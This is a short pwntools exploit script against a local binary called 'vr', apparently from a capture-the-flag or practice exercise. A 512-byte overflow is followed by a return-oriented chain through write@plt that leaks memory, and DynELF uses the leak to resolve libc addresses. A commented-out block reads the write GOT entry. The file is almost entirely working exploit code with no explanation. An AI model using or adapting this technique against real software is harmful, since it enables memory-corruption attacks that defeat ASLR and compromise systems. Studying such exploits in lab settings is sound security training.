from pwn import *

vul_func = 0x08048436
vr = ELF('vr')
write_plt = vr.symbols['write']
write_got = vr.got['write']
p = process('./vr')

def leak(address):
    shellcode = 512 * 'A'
    shellcode += p32(write_plt) + p32(vul_func) + p32(1) + p32(address) + p32(4)
    p.send(shellcode)
    return p.recv(4)

dyn = DynELF(leak, elf = vr)
print hex(dyn.lookup('write','libc'))
'''
w = u32(leak(write_got))
print hex(w)
'''
